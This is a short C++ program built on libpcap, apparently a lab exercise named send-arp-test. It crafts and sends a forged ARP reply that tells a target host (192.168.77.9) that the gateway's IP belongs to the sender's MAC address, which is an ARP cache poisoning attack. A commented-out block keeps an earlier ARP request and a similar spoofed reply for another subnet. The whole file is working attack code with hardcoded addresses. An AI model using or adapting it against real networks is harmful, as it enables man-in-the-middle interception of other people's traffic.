#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;
/*
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac("00:0c:29:4a:81:52");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;ss
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac("00:0c:29:4a:81:52");
    packet.arp_.sip_ = htonl(Ip("192.168.1.25"));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip("192.168.1.1"));



    packet.eth_.dmac_ = Mac("f0:a6:54:29:6e:5f");
    packet.eth_.smac_ = Mac("00:0c:29:4a:81:52");
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);//Request X
    packet.arp_.smac_ = Mac("00:0c:29:4a:81:52");//my
    packet.arp_.sip_ = htonl(Ip("192.168.1.1"));//gateway
    packet.arp_.tmac_ = Mac("f0:a6:54:29:6e:5f");//you
    packet.arp_.tip_ = htonl(Ip("192.168.1.30"));//you

     */

    packet.eth_.dmac_ = Mac("f0:a6:54:29:6e:5f");
    packet.eth_.smac_ = Mac("00:0c:29:4a:81:52");
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);//Request X
    packet.arp_.smac_ = Mac("00:0c:29:4a:81:52");//my  192.168.77.82
    packet.arp_.sip_ = htonl(Ip("192.168.77.35"));//gateway
    packet.arp_.tmac_ = Mac("f0:a6:54:29:6e:5f");//you
    packet.arp_.tip_ = htonl(Ip("192.168.77.9"));//you


	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
